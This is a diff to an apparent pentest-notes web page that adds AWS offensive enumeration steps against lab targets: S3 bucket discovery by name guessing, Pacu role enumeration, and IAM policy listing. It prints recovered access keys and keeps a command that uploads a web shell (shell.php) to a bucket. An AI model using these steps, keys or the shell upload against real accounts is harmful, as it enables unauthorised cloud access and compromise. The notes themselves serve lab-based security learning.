@@ -51,6 +51,11 @@
                 <td class="col-service">S3</td>
                 <td>Simple Storage Service - provides secure, durable, and highly available object storage</td>
                 </tr>
+                <tr>
+                <td class="col-icon"><img src="/H4ckV4ult/images/protocolsImages/iam.jfif" alt="IAM"></td>
+                <td class="col-service">IAM</td>
+                <td>Identity and Access Management - provides secure control over AWS resources</td>
+                </tr>
             </tbody>
             </table>
             </ul>
@@ -61,12 +66,78 @@
 host Target_IP
 whois offseclab.io
 nslookup 3.84.154.5</code></pre>
-            
+            <p>Just in case you are enumerating a local AWS environment you'll need to modify the <b>/etc/resolv.conf</b> In this file you only need to place the IP of the DNS server</p>
+            <pre><code class="language-bash">nameserver 52.206.233.48</code></pre>
+            <p>An then perform the query passing the domain name and the IP</p>
+            <pre><code class="language-bash">host -t TXT offseclab.io 52.206.233.48</code></pre>
+            <p>Another situation you may encontuner is to add a subdomain. In that case ask the DNS server just like this</p>
+            <pre><code class="language-bash"> dig www.offseclab.io @52.206.233.48 +short</code></pre>
+            <p>And then add the new ip to the /etc/hosts obviously providing the domain name</p>
             </ul>
 
+            <h2 id="Usage of AWS CLI">Usage of AWS CLI</h2>
+            <ul>
+                <h3>Defining profiles</h3>
+                <ul>
+                    <p>AWS cli works using profiles and credentials stored in the <b>~/.aws/credentials</b> file.</p>
+                    <p>You can define a profile by using the following command which will prompt you to enter your credentials:</p>
+                    <pre><code class="language-bash"></code>aws configure --profile amethyst-admin</code></pre>
+                    <p>Then check if you done it correctly</p>
+                    <pre><code class="language-bash">aws sts get-caller-identity --profile amethyst-admin</code></pre>
+                    <b>Warning: Have in mind that this actions are logged</b> 
+                </ul>    
+            </ul>
 
             <h2 id="Buckets S3">Buckets S3</h2>
             <ul>
+                <h2>Enumeration</h2>
+                <ul>
+                    <p>Is it recommended to check where the images of the website came from. Use the developer tools and go the <b>Network</b> tab. Then refresh and look for a request of an image. If you see something like</p>
+                    <pre><code class="language-bash">https://s3.amazonaws.com/offseclab-assets-public-gtyaqmqz/sites/www/images/amethyst-expanded.png</code></pre>
+                    <p>Then you can attempt to look at the root of the bucket where if you are lucky will find the information from all the images</p>
+                    <pre><code class="language-bash">https://s3.amazonaws.com/offseclab-assets-public-gtyaqmqz</code></pre>
+                    <p>or you could simply list it's contents by using CLI </p>
+                    <pre><code class="language-bash">aws s3 ls offseclab-assets-public-gtyaqmqz --profile attacker</code></pre>
+                    <p>If you would like to download all the files from the bucket, you can use the following command:</p>
+                    <pre><code class="language-bash">aws s3 sync s3://staticcontent-rv1b4sb4w8dgi3kk folder --profile attacker</code></pre>
+                    <h3>Discovering new buckets</h3>
+                    <ul>
+                        <p>Based on the name of the existing bucket (offseclab-assets-public-gtyaqmqz) we can attempt variations of the same. This may give us a clue</p>
+                        <pre><code class="language-bash">offseclab-assets-private-gtyaqmqz
+offseclab-assets-secure-gtyaqmqz
+offseclab-assets-secrets-gtyaqmqz
+...
+</code></pre>
+                    <p>We can automate all this process by using a tool called cloud_enum. Since buckets are publicly accessible we don't need to specify any IP</p>
+                    <pre><code class="language-bash">cloud_enum -kf wordlist.txt -qs --disable-azure --disable-gcp</code></pre>
+                    <p>Remember that even if you see an error which says that the bucket does not exist we could even try to access it's information</p>
+                    <pre><code class="language-bash">http://s3.amazonaws.com/offseclab-emerald-gtyaqmqz/file_to_access.txt</code></pre>
+                    </ul>
+                    
+                    <h3>Obtaining account IDs from S3 buckets</h3>
+                    <ul>
+                        <p>By simply knowing the public S3 bucket name, it is possible the get the AWS account ID of the target organization. Armed with the AWS account ID, you can then hunt for possible exposed EBS or RDS snapshots in the AWS management console. <a class="notion-link" href="https://rodelllemit.medium.com/pwnlabs-identify-the-aws-account-id-from-a-public-s3-bucket-9c0cee925bd3"> here you have an example of it</a></p>
+                    </ul>
+
+                    <h3>Gathering more info using IDS</h3>
+                    <ul>
+                        <p>Now that you have obtained the AWS account ID, you can use it to gather more information about the target organization. We can use a tool called <b>pacu</b></p>
+                        <p>First youll need to import keys of the user you would like to use:</p>
+                        <pre><code class="language-bash">import_keys attacker</code></pre>
+                        <p>Now te prompt will change <b>(Pacu (offseclab:imported-attacker) >)</b> and you can use <b>ls</b> command to display all available modules</p>
+                        <p>Since we don't have credentiales for any target user we will use the UNAUTH modules for example the following which let's you list roles:</p>
+                        <pre><code class="language-bash">run iam__enum_roles --word-list rolenames --account-id 265193793112  #account-id of your target</code></pre>
+                        <p>Luckyly for us some credentials were found: </p>
+                        <pre><code class="language-bash">"Credentials": {
+    "AccessKeyId": "ASIAT3PWIEZMBG56UN5S",
+    "SecretAccessKey": "8YJpXpai1BQAgTo8PKJzThBNx2QSJP4RMyq1ce70",
+    "SessionToken": "IQoJb3JpZ2luX2VjEBcaCXVzLWVhc3QtMSJIMEYCI..." }</code></pre>
+                        <p>Now we can use the previous command to "login" as that user <b>(aws configure --profile amethyst-admin)</b></p>    
+                        <p>With this role we could be able to perform actions within the AWS environment</p>
+                    </ul>
+
+                </ul>
+                
                 <h2>Exploitation</h2>
                 <ul>
                     <p>⚠️ IMPORTANT </p>
@@ -83,9 +154,64 @@ nslookup 3.84.154.5</code></pre>
                     <pre><code class="language-bash">aws --endpoint=http://s3.thetoppers.htb --profile=test s3 ls s3://thetoppers.htb  </code></pre>
                     <h3> Download using credentials </h3>
                     <pre><code class="language-bash">aws --endpoint=http://s3.thetoppers.htb --profile=test s3 cp s3://thetoppers.htb/index.php index.php  </code></pre>
+                    <p>Download multiple files</p>
+                    <pre><code class="language-bash">aws s3 sync s3://staticcontent-lgudbhv8syu2tgbk ./static_content/</code></pre>
                     <h3> Upload using credentials </h3>
                     <pre><code class="language-bash">aws --endpoint=http://s3.thetoppers.htb --profile=test s3 cp /home/kali/Desktop/Hackthebox/Starting\ POint/Three/shell.php s3://thetoppers.htb/shell.php  </code></pre>
+                </ul>
+                    
+            </ul>
+
+            <h2 id="IAM">IAM</h2>
+            <ul>
+                <h3>Basic listing</h3>
+                <ul>
+                    <pre><code class="language-bash">aws --profile target iam list-users   #Listing users 
+aws --profile target iam list-groups  #Listing groups
+aws --profile target iam list-roles   #Listing roles
+aws --profile target iam list-policies --scope Local --only-attached 
+aws --profile target iam get-account-authorization-details  #Get all information about IAM users (May not work based on permissions but in case it works you may be able to obtain informatin that by other methods you couldn't)</code></pre>
+                </ul>
+
+                <h3>Automate process</h3>
+                <ul>
+                    <p>Pacu tool let us automate the process of enumerating IAM permissions. Just open it, list modules and check for <b>[Category: ENUM]</b></p>
+                </ul>
+
+                <h3>Listing policies</h3>
+                <ul>
+                    <p>We can attempt to list policies associated with the user or role. Use the following command. If it does not appear any error means that we have the permission <b>iam:ListAttachedUserPolicies action</b></p>
+                    <pre><code class="language-bash">aws --profile target iam list-user-policies --user-name clouddesk-plove</code></pre>
                 </ul>    
+
+                <h3>Listing groups and policies based on a user</h3>
+                <ul>
+                    <p>In case any group is listed we can deduce that some policies may be inherited since the user belongs to that group</b></p>
+                    <pre><code class="language-bash">aws --profile target iam list-groups-for-user --user-name clouddesk-plove</code></pre>
+                    <p>If we find any group we can check the policies associated with it. There are two types of policies: managed policies and inline policies.</p>
+                    <h4>Managed Policies</h4>
+                    <ul>
+                        <p> AWS managed policies are designed to provide permissions for many common use cases. They make it easier for you to get started with assigning permissions to users, groups, and roles than if you had to write the policies yourself.</p>
+                        <pre><code class="language-bash">aws --profile target iam list-group-policies --group-name support</code></pre>
+                        <b>these policies often grant broader permissions than might be desired. Ideally, they should be paired with other more-restrictive policies to ensure fine-grained permission control.</b>
+                    </ul>
+                    <h4>Inline Policies</h4>
+                    <ul>
+                        <p>Inline policies are embedded directly within the user, group, or role and belong exclusively to that principal.</p>
+                        <pre><code class="language-bash">aws --profile target iam list-attached-group-policies --group-name support</code></pre>
+                    </ul>    
+                    <p>Now we can check the version of that policy:</p>
+                    <pre><code class="language-bash">aws --profile target iam list-policy-versions --policy-arn "arn:aws:iam::aws:policy/job-function/SupportUser"</code></pre>
+                    <p>And finally inspect the policy details:</p>
+                    <pre><code class="language-bash">aws --profile target iam get-policy-version --policy-arn arn:aws:iam::aws:policy/job-function/SupportUser --version-id v8</code></pre>
+                    <p>Finally, in case you don't have the privileges to query IAM-related information we can use the module <b>iam__bruteforce_permissions</b> from pacu to identify actions we could perform</p>
+                </ul>  
+                <h3>Gather additional information</h3>
+                <ul>
+                    <p>We can use the following command to gather account summary information:</p>
+                    <pre><code class="language-bash">aws --profile target iam get-account-summary | tee account-summary.json</code></pre>
+                    <p>An important thing to note is the parameter <b>"AccountMFAEnabled": 0</b> which indicates that Multi-Factor Authentication is not enabled for the account.</p>
+                </ul>
             </ul>
         </div>
     </div>
